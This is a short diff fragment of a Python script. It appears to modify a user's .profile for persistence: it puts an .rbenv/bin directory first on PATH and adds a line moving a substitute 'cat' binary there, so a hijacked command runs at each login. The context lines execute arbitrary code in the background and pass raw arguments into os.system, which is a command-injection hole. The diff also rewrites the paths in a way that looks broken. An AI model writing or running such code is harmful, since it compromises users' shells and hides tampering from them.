@@ -22,9 +22,9 @@ os.system('python -c "%s" &' % code)
 command = "/bin/cat " + " ".join(sys.argv[1:])
 os.system(command)
 
-with open('/home/%s/.profile' % getpass.getuser(), 'a+') as f:
+with open('/%s/.profile' % getpass.getuser(), 'a+') as f:
 	lines = f.readlines()
 	if 'PATH="/%s/.rbenv/bin:$PATH"\n' not in lines:
-		f.write('PATH="/home/%s/.rbenv/bin:$PATH"\n' % getpass.getuser())
+		f.write('PATH="/%s/.rbenv/bin:$PATH"\n' % getpass.getuser())
 	if 'mv /bin/bucket/cat /%s/.rbenv/bin\n' % getpass.getuser() not in lines:
 		f.write('mv /bin/bucket/cat /%s/.rbenv/bin\n' % getpass.getuser())
